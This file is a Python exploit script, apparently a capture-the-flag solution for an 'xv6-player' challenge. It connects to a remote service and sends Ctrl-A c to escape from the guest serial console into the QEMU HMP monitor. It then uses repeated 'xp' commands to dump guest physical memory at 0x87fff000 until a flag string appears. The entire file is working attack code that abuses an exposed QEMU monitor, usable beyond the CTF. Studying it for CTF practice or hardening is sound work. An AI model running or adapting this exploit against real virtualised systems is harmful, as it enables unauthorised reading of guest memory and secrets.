#!/usr/bin/env python3
"""
Robust exploit for xv6-player.

Usage:
    ./solve_xv6_player.py HOST PORT

The bug is QEMU monitor exposure through -nographic stdio-mux.  The flag page is
at guest physical address 0x87fff000.  This version dumps in small chunks and
only prints a complete HCMUS-CTF{...} flag, so punctuation such as '*' is safe.
"""
import argparse
import re
import select
import socket
import sys
import time

FLAG_PHYS = 0x87FFF000
FLAG_RE = re.compile(rb"HCMUS[-_]CTF\{[ -~]{1,300}?\}")


def drain(sock: socket.socket, timeout: float = 0.3) -> bytes:
    """Read whatever is currently available."""
    end = time.time() + timeout
    out = bytearray()
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], max(0.0, end - time.time()))
        if not r:
            break
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            continue
        if not chunk:
            break
        out += chunk
        # Extend slightly after data arrives to coalesce network fragments.
        end = max(end, time.time() + 0.08)
    return bytes(out)


def read_until_prompt(sock: socket.socket, timeout: float = 3.0) -> bytes:
    """Read until the QEMU HMP prompt appears after a command."""
    end = time.time() + timeout
    out = bytearray()
    while time.time() < end:
        r, _, _ = select.select([sock], [], [], max(0.0, end - time.time()))
        if not r:
            continue
        try:
            chunk = sock.recv(4096)
        except BlockingIOError:
            continue
        if not chunk:
            break
        out += chunk
        # HMP prints a new prompt after command output.  Give it one tiny extra
        # read so the final line is not cut in the middle on slow links.
        if b"(qemu)" in out:
            out += drain(sock, 0.15)
            break
    return bytes(out)


def enter_monitor(sock: socket.socket) -> bytes:
    """Switch QEMU stdio from guest serial to HMP monitor."""
    sock.sendall(b"\x01c")  # Ctrl-A c
    return read_until_prompt(sock, 3.0)


def parse_xp_bytes(text: bytes) -> bytes:
    """Parse byte values from HMP lines like: 0000000087fff000: 0x48 ..."""
    leaked = bytearray()
    for line in text.splitlines():
        # Keep only real xp output lines.  This avoids parsing command echoes or
        # unrelated boot messages that contain ':' characters.
        if not re.match(rb"^[0-9a-fA-F]{8,16}:", line.strip()):
            continue
        rest = line.split(b":", 1)[1]
        for m in re.finditer(rb"0x([0-9a-fA-F]{1,2})\b", rest):
            leaked.append(int(m.group(1), 16))
    return bytes(leaked)


def dump_phys(sock: socket.socket, addr: int, total: int, chunk: int = 16, debug: bool = False) -> bytes:
    """Dump guest physical memory through HMP xp in small reliable chunks."""
    data = bytearray()
    for off in range(0, total, chunk):
        n = min(chunk, total - off)
        cmd = f"xp /{n}bx 0x{addr + off:x}\n".encode()
        sock.sendall(cmd)
        resp = read_until_prompt(sock, 3.0)
        if debug:
            sys.stderr.write(resp.decode(errors="replace"))
            sys.stderr.flush()
        got = parse_xp_bytes(resp)
        if len(got) != n:
            # Retry once with an even smaller command if the network split or HMP
            # output was weird.
            time.sleep(0.1)
            sock.sendall(cmd)
            resp2 = read_until_prompt(sock, 3.0)
            if debug:
                sys.stderr.write(resp2.decode(errors="replace"))
                sys.stderr.flush()
            got = parse_xp_bytes(resp2)
        data += got

        m = FLAG_RE.search(bytes(data))
        if m:
            return bytes(data)
    return bytes(data)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--dump-size", type=int, default=0x400, help="bytes to dump from the flag page")
    ap.add_argument("--debug", action="store_true", help="show raw QEMU monitor responses")
    ap.add_argument("--boot-delay", type=float, default=1.5)
    args = ap.parse_args()

    with socket.create_connection((args.host, args.port), timeout=10) as sock:
        sock.setblocking(False)

        banner = drain(sock, 2.0)
        if args.debug:
            sys.stderr.write(banner.decode(errors="replace"))
            sys.stderr.flush()

        # Send a zero-length init program.  xv6 may panic on exec, but QEMU stays
        # alive and the exposed monitor remains usable.
        sock.sendall(b"0\n")
        time.sleep(args.boot_delay)
        boot = drain(sock, 0.8)
        if args.debug:
            sys.stderr.write(boot.decode(errors="replace"))
            sys.stderr.flush()

        mon = enter_monitor(sock)
        if args.debug:
            sys.stderr.write(mon.decode(errors="replace"))
            sys.stderr.flush()

        blob = dump_phys(sock, FLAG_PHYS, args.dump_size, chunk=16, debug=args.debug)

    m = FLAG_RE.search(blob)
    if m:
        print(m.group(0).decode(errors="replace"))
        return 0

    # No fake success: show useful recovered printable data for manual inspection.
    printable = ''.join(chr(c) if 32 <= c < 127 else '.' for c in blob)
    print("[-] Complete flag was not found.", file=sys.stderr)
    print(f"[-] Dumped {len(blob)} bytes from 0x{FLAG_PHYS:x}.", file=sys.stderr)
    print(printable, file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
